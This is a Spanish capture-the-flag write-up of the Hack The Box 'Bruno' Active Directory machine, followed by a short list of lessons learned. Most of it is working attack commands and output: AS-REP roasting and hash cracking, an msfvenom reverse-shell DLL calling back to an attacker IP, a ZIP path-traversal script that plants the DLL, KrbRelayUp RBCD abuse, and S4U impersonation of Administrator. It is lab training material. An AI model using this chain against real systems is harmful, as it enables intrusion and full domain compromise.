---
title: Bruno
description: Bruno
tags: [HTB]
---
## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sSCV -Pn 10.129.238.9

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed
| <DIR> app   <DIR> benign   <DIR> malicious   <DIR> queue
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: bruno.vl)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   Product_Version: 10.0.20348
```

```bash
echo "10.129.238.9 bruno.vl brunodc.bruno.vl BRUNODC" | sudo tee -a /etc/hosts
```

### Enumeración FTP anónimo

```bash
lftp -e "mirror --parallel=5 / ./ftp_download; quit" -u anonymous,anonymous ftp://10.129.238.9

Total: 4 directories, 7 files, 0 symlinks
New: 7 files, 0 symlinks
182684 bytes transferred in 5 seconds
```

```bash
ls ftp_download/

app   benign   malicious   queue
```

> En `app/` hay un binario `SampleScanner.exe` y un archivo `changelog`. El changelog revela el usuario `svc_scan`.
> 

```bash
cat ftp_download/app/changelog

Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.1
- initial support for EICAR string
```

### Análisis del binario SampleScanner

Al descompilar `SampleScanner.dll` con `monodis` se observa la lógica del escáner:

- Monitorea `C:\samples\queue\` buscando archivos `.zip`
- Extrae el ZIP usando `Path.Combine("C:\\samples\\queue\\", entry.FullName)` **sin sanitizar el nombre de la entrada** → **ZIP Path Traversal**
- Escanea el contenido en busca de la firma EICAR
- Si no contiene EICAR, lo mueve a `benign`; si lo contiene, a `malicious`

> La vulnerabilidad clave: `Path.Combine` con `FullName` no valida rutas como `../app/hostfxr.dll`, permitiendo escribir archivos fuera del directorio `queue`.
> 

### Enumeración de vhost

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.238.9 \
  -H "Host: FUZZ.bruno.vl" \
  -mc 200,301,302,401,403 \
  -fs 703`

dev    [Status: 200, Size: 2719]
```

```bash
echo "10.129.238.9 dev.bruno.vl" | sudo tee -a /etc/hosts
```

> `dev.bruno.vl` es la aplicación web que usa el escáner. La carpeta `app/` del FTP corresponde a `C:\samples\app\` en el servidor.
> 

---

## 2. Vector de entrada — AS-REP Roasting + ZIP Path Traversal + DLL Hijack

### Paso 1 — AS-REP Roasting sobre svc_scan

`svc_scan` no requiere preautenticación Kerberos (atributo `DONT_REQUIRE_PREAUTH`). Esto permite solicitar un TGT sin conocer la contraseña y obtener un hash crackeable offline.

```bash
impacket-GetNPUsers bruno.vl/svc_scan -dc-ip 10.129.238.9 -no-pass

[*] Getting TGT for svc_scan
$krb5asrep$23$svc_scan@BRUNO.VL:65db862df6505ac849a7dfb1d05b74d2$3b9245c3b...2b7d6e
```

```bash
hashcat -m 18200 svc_scan.hash /usr/share/wordlists/rockyou.txt --force`

`$krb5asrep$23$svc_scan@BRUNO.VL:...:Sunshine1

Status: Cracked

svc_scan : Sunshine1
```

```bash
nxc smb 10.129.238.9 -u 'svc_scan' -p 'Sunshine1'

SMB  10.129.238.9  445  BRUNODC  [+] bruno.vl\svc_scan:Sunshine1
```

### Paso 2 — Verificar permisos en SMB

```bash
nxc smb 10.129.238.9 -u 'svc_scan' -p 'Sunshine1' -M spider_plus

SMB  Writable Shares: 1 (queue)
```

> `svc_scan` tiene **escritura** en el share `queue` → `C:\samples\queue\`. El escáner procesa ZIPs depositados allí.
> 

### Paso 3 — Generar DLL maliciosa (reverse shell)

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.72 \
  LPORT=4444 \
  -f dll \
  -o hostfxr.dll

Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: hostfxr.dll
```

> `hostfxr.dll` es una DLL legítima del runtime de .NET Core cargada por `SampleScanner.exe` al iniciarse. Al reemplazarla en `C:\samples\app\`, el escáner cargará nuestra DLL maliciosa en el próximo ciclo — **DLL Hijacking**.
> 

### Paso 4 — Crear ZIP con path traversal

```bash
import zipfile

with open('hostfxr.dll', 'rb') as f:
    dll_bytes = f.read()

with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr('../app/hostfxr.dll', dll_bytes)
```

```bash
python3 make_zip.py
```

> La entrada `../app/hostfxr.dll` dentro del ZIP hace que `Path.Combine("C:\\samples\\queue\\", "../app/hostfxr.dll")` resuelva a `C:\samples\app\hostfxr.dll`.
> 

### Paso 5 — Subir el ZIP al share queue

```bash
smbclient //10.129.238.9/queue \
  -U 'bruno.vl/svc_scan%Sunshine1' \
  -c 'put exploit.zip'

putting file exploit.zip as \exploit.zip (19.9 kB/s)
```

---

## 3. Acceso inicial

```bash
rlwrap -cAr nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.14.72] from (UNKNOWN) [10.129.238.9] 54922
Microsoft Windows [Version 10.0.20348.768]

C:\Windows\system32> whoami
bruno\svc_scan
```

```bash
type C:\Users\svc_scan\Desktop\user.txt`

[user flag]
```

### Enumeración post-acceso

```bash
net user

Administrator  Charles.Young  Chloe.Ball  Donna.Harrison  Graeme.Grant
Hugh.Young  Jeremy.Singh  Kayleigh.Patel  Kieran.Day  krbtgt
Natalie.Anderson  Sam.Owen  svc_net  svc_scan
```

```bash
nxc ldap brunodc.bruno.vl -u svc_scan -p 'Sunshine1' -M maq

MachineAccountQuota: 10
```

> `MachineAccountQuota = 10` significa que cualquier usuario del dominio puede crear hasta 10 cuentas de máquina. Esto es el requisito previo para **KrbRelayUp con RBCD**.
> 

---

## 4. Escalada de privilegios — KrbRelayUp + RBCD

**KrbRelayUp** abusa de la autenticación Kerberos forzada desde `NT AUTHORITY\SYSTEM` para relaearla contra LDAP y configurar **Resource-Based Constrained Delegation (RBCD)** sobre el DC. Luego se usa S4U2Proxy para obtener un ticket de servicio como `Administrator`.

**Flujo:**

1. Se crea una cuenta de máquina controlada (`relay$`)
2. KrbRelayUp fuerza al proceso SYSTEM a autenticarse via COM/RPC
3. Esa autenticación se reenvía a LDAP para configurar RBCD: `relay$` puede delegar en nombre de cualquier usuario hacia `brunodc.bruno.vl`
4. Con S4U2Proxy se obtiene un ticket como `Administrator` para el servicio HOST del DC
5. Se usa ese ticket para ejecutar comandos como SYSTEM

### Paso 1 — Identificar un CLSID de servicio local en ejecución

```bash
Invoke-WebRequest -Uri "http://10.10.14.72:8081/GetCLSID.ps1" -OutFile "C:\ProgramData\GetCLSID.ps1"
.\GetCLSID.ps1
```

```bash
Import-Csv C:\ProgramData\Windows_Server_2022_Datacenter\CLSIDs.csv | ForEach-Object {
    $entry = $_
    try {
        $svc = Get-Service $entry.LocalService -ErrorAction Stop
        if ($svc.Status -eq "Running") { "$($entry.LocalService) | $($entry.CLSID)" }
    } catch {}
}

CertSvc | {D99E6E73-FC88-11D0-B498-00A0C90312F3}
UsoSvc  | {84C80796-F07C-4340-8897-DA954AADBF16}
vds     | {7D1933CB-86F6-4A98-8628-01BE94C9A575}
```

### Paso 2 — Ejecutar KrbRelayUp para configurar RBCD

```bash
.\KrbRelayUp.exe relay 
  -Domain bruno.vl 
  -CreateNewComputerAccount 
  -ComputerName "relay$" 
  -ComputerPassword Password123 
  -cls D99E6E73-FC88-11D0-B498-00A0C90312F3

[+] Computer account "relay$" added with password "Password123"
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn relay$ -cp Password123
```

### Paso 3 — Obtener ticket S4U2Proxy como Administrator

```bash
impacket-getST \
  -spn 'HOST/brunodc.bruno.vl' \
  -impersonate administrator \
  -dc-ip 10.129.238.9 \
  'bruno.vl/relay$:Password123'

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@HOST_brunodc.bruno.vl@BRUNO.VL.ccache
```

### Paso 4 — Usar el ticket para ejecutar comandos como SYSTEM

```bash
export KRB5CCNAME=administrator@HOST_brunodc.bruno.vl@BRUNO.VL.ccache

impacket-wmiexec -k -no-pass brunodc.bruno.vl`

C:\> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
0e71aa52b08a386e1a33483ff2e8ced4
```

---

---

## 6. Lecciones aprendidas

- **`Path.Combine` no sanitiza rutas en ZIPs.** Si un escáner/procesador extrae un ZIP usando `entry.FullName` sin validar `..`, cualquier archivo puede escribirse fuera del directorio destino. Siempre validar que la ruta resuelta esté dentro del directorio base esperado.
- **Los changelogs y comentarios en código revelan usuarios de servicio.** `svc_scan` apareció en el changelog del FTP — antes de fuerza bruta, siempre leer toda la documentación del objetivo.
- **AS-REP Roasting funciona sin credenciales si el usuario tiene `DONT_REQUIRE_PREAUTH`.** No hace falta ningún acceso previo al dominio para obtener el hash — solo conectividad al puerto 88.
- **DLL Hijacking via path traversal en ZIP es devastador.** Combinar escritura en una carpeta procesada + ZIP sin sanitizar + aplicación que carga DLLs desde un directorio escribible = RCE garantizado.
- **MachineAccountQuota > 0 + sesión como usuario de dominio = KrbRelayUp viable.** Con permisos para crear cuentas de máquina, KrbRelayUp puede forzar RBCD desde dentro de la máquina sin necesitar ningún privilegio especial.
- **En máquinas similares buscar:** aplicaciones que procesen ZIPs automáticamente (antivirus, scanners, CI pipelines), usuarios de servicio con `DONT_REQUIRE_PREAUTH` en el changelog o código fuente, `MachineAccountQuota` > 0 para KrbRelayUp, shares SMB con escritura hacia carpetas monitorizadas por servicios.